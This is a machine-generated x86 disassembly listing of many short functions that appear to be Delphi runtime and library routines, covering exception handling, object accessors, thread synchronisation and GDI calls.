sub_41c134
mov eax [ eax + 0x18 ]
retn
sub_41c138
mov eax [ eax + 0x14 ]
retn
sub_41c1d4
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_41c3e0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_4027dc
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_41c41c
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_41c434
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_41c448
mov edx sub_41c434
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_41c490
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_4081d4
retn
mov eax edx
mov edx ecx
call sub_40819c
retn
sub_41c52c
retn
sub_41c824
jmp sub_403988
sub_41c82b
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41c88c
jmp sub_403988
sub_41c893
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c8d8
mov eax [ eax + 0x4 ]
call sub_40874c
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41c8e8
mov eax [ eax + 0x4 ]
call sub_408778
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41c924
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_41cacd
jmp sub_403988
sub_41cb2c
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_41cbbc
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41cc0c
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_41cc2b
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_41cdf7
jmp sub_403988
sub_41cdfe
mov esp ebp
pop ebp
retn
sub_41cea8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
retn
sub_41cf30
mov [ eax + 0x18 ] edx
retn
sub_41d0ac
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_4168e4
retn
sub_41d133
jmp sub_403988
sub_41d13a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41d1e6
jmp sub_403988
sub_41d1ed
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d391
jmp sub_403988
sub_41d3e3
jmp sub_403988
sub_41d402
jmp sub_403988
sub_41d409
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d428
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41d421
jmp sub_403988
sub_41d428
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d4cb
jmp sub_403988
sub_41d553
jmp sub_403988
sub_41d560
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
pop ebx
retn
sub_41d578
mov eax [ rw-data ]
call sub_41d560
retn
sub_41d5b0
push ebx
call sub_416764
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41d578
sub_41d71d
jmp sub_403988
sub_41d724
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_404008
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_41d844
jmp sub_403988
sub_41d84b
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41d942
jmp sub_403988
sub_41d95f
jmp sub_403988
sub_41d966
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41da64
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41c4ac
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_41db28
push ebx
mov ebx eax
mov eax ebx
call sub_41f4dc
cmp al 0x9
sete al
pop ebx
retn
sub_41db87
jmp sub_403988
sub_41db8e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41dc34
jmp sub_403988
sub_41dc3b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41deba
jmp sub_4036d4
sub_41dee6
jmp sub_4036d4
sub_41df88
jmp sub_4036d4
sub_41e02b
jmp sub_4036d4
sub_41e203
jmp sub_4036d4
sub_41e245
jmp sub_403988
sub_41e275
jmp sub_403988
sub_41e27c
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e2eb
jmp sub_403988
sub_41e3c2
jmp sub_403988
sub_41e3c9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e69c
mov dl 0x1
call sub_41d604
retn
sub_41e7d4
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_41e7dd
jmp sub_403988
j_sub_41e7d4
jmp sub_41e7d4
sub_41e7e4
pop ebx
mov esp ebp
pop ebp
retn
sub_41e7ec
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41f5ec
mov eax [ rw-data ]
call sub_41d560
pop ebp
retn
j_sub_403800#9
jmp sub_403800
j_sub_403800#8
jmp sub_403800
sub_41e9d8
jmp sub_403988
sub_41e9df
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41eabf
jmp sub_403988
sub_41eac6
mov esp ebp
pop ebp
retn
sub_41eb7e
jmp sub_403988
sub_41eb85
pop ecx
pop ecx
pop ebp
retn
sub_41ee87
jmp sub_403988
sub_41ee8e
pop ebx
mov esp ebp
pop ebp
retn
sub_41f133
jmp sub_403988
sub_41f13a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_403234
retn
sub_41f153
jmp sub_403988
sub_41f177
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4036d4
sub_41f1ae
jmp sub_4036d4
sub_41f1ed
jmp sub_403988
sub_41f1f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f216
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_40402c
retn
sub_41f20f
jmp sub_403988
sub_41f216
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f29d
jmp sub_4036d4
sub_41f2ca
jmp sub_403988
sub_41f2d1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f2dc
push ecx
mov edx esp
mov ecx 0x4
call sub_41daa0
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_41d560
sub_41f3e9
jmp sub_403988
sub_41f3f0
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f4cf
jmp sub_403988
sub_41f4d6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f52c
jmp sub_403988
sub_41f533
pop ebx
pop ecx
pop ebp
retn
sub_41f77b
jmp sub_403988
sub_41f782
pop ecx
pop ecx
pop ebp
retn
sub_41f7c5
jmp sub_403988
sub_41f7cc
pop ebx
pop ecx
pop ebp
retn
sub_41f868
jmp sub_403988
sub_41f86f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f91d
jmp sub_403988
sub_41f924
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f930
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_41fb8b
jmp sub_403988
sub_41fb92
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fbb7
mov eax [ ebp - 0x8 ]
call sub_403234
mov eax [ ebp - 0x4 ]
call sub_403234
retn
sub_41fbb0
jmp sub_403988
sub_41fbb7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fbdc
lea eax [ ebp - 0x1c ]
call sub_405a38
lea eax [ ebp - 0x18 ]
call sub_404008
retn
sub_41fbd5
jmp sub_403988
sub_41fbdc
pop ebx
mov esp ebp
pop ebp
retn
sub_41fdee
jmp sub_403988
sub_41fdf5
pop ebx
mov esp ebp
pop ebp
retn
sub_41fe48
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_41c710
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_41fe60
test dl dl
je r-xdata
mov dl 0x8
call sub_41ffe4
retn
mov dl 0x9
call sub_41ffe4
retn
sub_41fee8
mov dl 0x1
call sub_41ffe4
retn
sub_41fef0
xor edx edx
call sub_41ffe4
retn
sub_41ffd5
jmp sub_403988
sub_41ffdc
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41fff8
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40cfc8
sub_42002c
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_420044
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_420050
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_420044
sub_42006c
mov eax [ rw-data ]
push eax
call SetEvent
retn
sub_420078
push rw-data
call InterlockedIncrement
retn
sub_420084
push rw-data
call InterlockedDecrement
retn
sub_42019a
jmp sub_4036d4
sub_4201c9
jmp sub_403988
sub_4201ff
jmp sub_403988
sub_420206
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420225
push rw-data
call LeaveCriticalSection
retn
sub_42021e
jmp sub_403988
sub_420225
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420271
jmp sub_4036d4
sub_420382
jmp sub_403988
sub_420389
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_420410
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
call sub_420640
sub_42048a
jmp sub_403988
sub_420491
pop ebx
mov esp ebp
pop ebp
retn
sub_4204b0
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_4204c4
cmp [ eax + 0x1a ] 0x0
je r-xdata
retn
push eax
push sub_4204b0
call sub_420618
sub_4205bd
jmp sub_403988
sub_4205c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4205e3
push rw-data
call LeaveCriticalSection
retn
sub_4205dc
jmp sub_403988
sub_4205e3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call CloseHandle
retn
sub_4205fa
jmp sub_403988
sub_420668
mov [ eax + 0xd ] 0x1
retn
sub_4207d8
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_4209b4
sub_420838
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41e5ec
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_42084c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41e5ec
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_420860
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41fe74
retn
sub_42086c
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41fe74
retn
sub_420b14
xor eax eax
retn
sub_420b18
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_420b20
xor eax eax
retn
sub_420b24
retn
sub_420b28
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40405c
pop esi
pop ebx
retn
sub_420b3c
mov eax [ eax + 0x4 ]
retn
sub_420b40
retn
sub_420b44
xor eax eax
retn
sub_420b48
retn
sub_420b4c
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_420b58
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_420b64
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_420b70
retn
sub_420b74
xchg edx eax
call sub_41e290
retn
sub_420b7c
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_420c04
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_403430
pop esi
retn
sub_420c18
retn
sub_420cf8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_40405c
pop esi
pop ebx
retn
sub_420d38
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_420e84
push ebx
mov ebx eax
test dl dl
je r-xdata
and [ ebx + 0x24 ] 0xfb
pop ebx
retn
or [ ebx + 0x24 ] 0x4
pop ebx
retn
sub_420e98
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_40347c
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_420eb0
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_420f38
retn
sub_420f80
retn
sub_420fb8
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_420fd0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_4211f4
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_403430
pop esi
pop ebx
retn
sub_421018
mov al 0x1
retn
sub_42101c
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_421024
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_4210cc
xor eax eax
retn
sub_4210d0
retn
sub_4210fc
retn
sub_421194
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4211a8
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_41a30c
retn
sub_4212ef
jmp sub_4036d4
sub_4212f4
mov ebx 0x1
call sub_403a3c
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421357
jmp sub_4036d4
sub_42135c
mov ebx 0x80030103
call sub_403a3c
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_4213da
jmp sub_4036d4
sub_4213df
mov ebx 0x80030009
call sub_403a3c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_42143d
jmp sub_4036d4
sub_421442
mov ebx 0x8000ffff
call sub_403a3c
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_42160d
jmp sub_403988
sub_42161e
jmp sub_4036d4
sub_421623
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403a3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42164c
lea eax [ ebp + 0xc ]
call sub_405a38
retn
sub_421645
jmp sub_403988
sub_42164c
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_421658
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_421664
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_421670
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_42167c
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_4216eb
jmp sub_4036d4
sub_4216f0
mov esi 0x8000ffff
call sub_403a3c
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_421704
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_421771
jmp sub_403988
sub_421778
mov eax [ rw-data ]
call sub_403234
pop edi
pop esi
pop ebx
pop ebp
retn
sub_421788
call sub_419c58
retn
sub_421850
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_4219f4
jmp sub_403988
sub_4219fb
pop ebp
retn
sub_421a89
jmp sub_403988
sub_421a90
pop ebp
retn
sub_421d59
jmp sub_403988
sub_421d60
pop ebp
retn
sub_421d64
sub [ rw-data ] 0x1
retn
sub_422d14
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_422d88
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_422dfc
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_422e08
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_422ee8
jmp sub_403988
sub_422eef
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_422f7f
jmp sub_403988
sub_423011
jmp sub_403988
sub_423018
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42307c
jmp sub_403988
sub_423083
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4230eb
jmp sub_403988
sub_4230f2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423195
jmp sub_403988
sub_42319c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4235f4
push 0x33
mov ecx rw-data
call sub_419f18
retn
sub_423604
push 0x33
mov ecx rw-data
call sub_419ed8
retn
sub_423614
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_423638
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_42380c
push 0x11
mov ecx rw-data
call sub_419ed8
retn
sub_42394c
push ebx
mov ebx eax
mov eax ebx
call sub_423614
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_423a06
jmp sub_403988
sub_423a0d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423638
retn
sub_423a23
jmp sub_403988
sub_423a3c
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_423a99
jmp sub_403988
sub_423aa0
pop ebx
pop ecx
pop ebp
retn
sub_423c19
jmp sub_403988
sub_423c41
jmp sub_403988
sub_423c48
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_423cb4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_40426c
pop esi
pop ebx
retn
sub_423d28
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_423c84
push eax
call MulDiv
neg eax
pop ebx
retn
sub_423d9c
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_423dcc
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_423eea
jmp sub_403988
sub_423ef1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423638
retn
sub_423f07
jmp sub_403988
sub_423f7d
jmp sub_403988
sub_423f84
pop ebx
pop ecx
pop ebp
retn
sub_423f88
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_42403e
jmp sub_403988
sub_424064
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_424094
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_4241a3
jmp sub_403988
sub_4241aa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423638
retn
sub_4241c0
jmp sub_403988
sub_424239
jmp sub_403988
sub_424240
pop ebx
pop ecx
pop ebp
retn
sub_424371
jmp sub_403988
sub_424384
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_4246c4
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_4248a0
jmp sub_403988
sub_4248a7
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_4248b0
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_4248e8
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4248f4
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_424a34
retn
sub_424afd
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_424b14
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_424c00
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424c20
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424c40
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424c60
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
pop ebx
retn
sub_424c78
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
pop ebx
retn
sub_424c9c
mov eax [ rw-data ]
call sub_424c78
retn
sub_424cfe
jmp sub_403988
sub_424d05
pop ecx
pop ebp
retn
sub_424da4
jmp sub_403988
sub_424dab
pop ebx
mov esp ebp
pop ebp
retn
sub_424e7d
jmp sub_403988
sub_424f0e
jmp sub_403988
sub_424f15
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424f40
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_425027
jmp sub_403988
sub_4251d4
jmp sub_403988
sub_4251db
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_4253ed
jmp sub_403988
sub_4253f4
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_42548e
jmp sub_403988
sub_42566a
jmp sub_403988
sub_425724
jmp sub_403988
sub_42572b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42574b
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_425744
jmp sub_403988
sub_42574b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4258d9
jmp sub_403988
sub_425aa4
jmp sub_403988
sub_425aab
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425ace
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4027bc
retn
sub_425ac7
jmp sub_403988
sub_425ace
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425aee
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4027bc
retn
sub_425ae7
jmp sub_403988
sub_425aee
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_425af8
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_425c58
push 0x0
call sub_425bf4
retn
sub_425cfd
jmp sub_403988
sub_425d04
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_425d10
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_425c60
pop ebx
pop ebp
retn 0x4
sub_425d24
retn
sub_425d28
test eax eax
jne r-xdata
retn
call sub_425d24
sub_425efb
jmp sub_403988
sub_425f22
jmp sub_403988
sub_425f29
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425f68
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_426135
mov eax [ ebp - 0xc ]
call sub_403234
retn
sub_42613e
jmp sub_403988
j_sub_426135
jmp sub_426135
sub_426145
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403234
retn
sub_42615b
jmp sub_403988
sub_42616c
xor eax eax
retn
sub_426170
mov al [ eax + 0x21 ]
retn
sub_4261bc
jmp sub_403988
sub_4261c3
pop esi
pop ecx
pop ebp
retn
sub_4261f0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_426247
jmp sub_403988
sub_42624e
pop esi
pop ecx
pop ebp
retn
sub_426254
retn
sub_426258
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_426268
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_4263ed
jmp sub_403988
sub_4263f4
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_426513
jmp sub_403988
sub_42651a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4265a2
jmp sub_403988
sub_4265a9
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426704
jmp sub_4036d4
sub_426728
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_426310
mov [ rw-data ] eax
sub_426748
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_426614
mov [ rw-data ] eax
sub_426870
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_42680c
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_426888
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_42680c
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_4268a0
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_42680c
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_426948
jmp sub_4036d4
sub_426968
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_426870
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
sub_426980
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_426870
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
sub_426aed
jmp sub_4036d4
sub_426b6b
jmp sub_403988
sub_426b72
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426ca0
xor edx edx
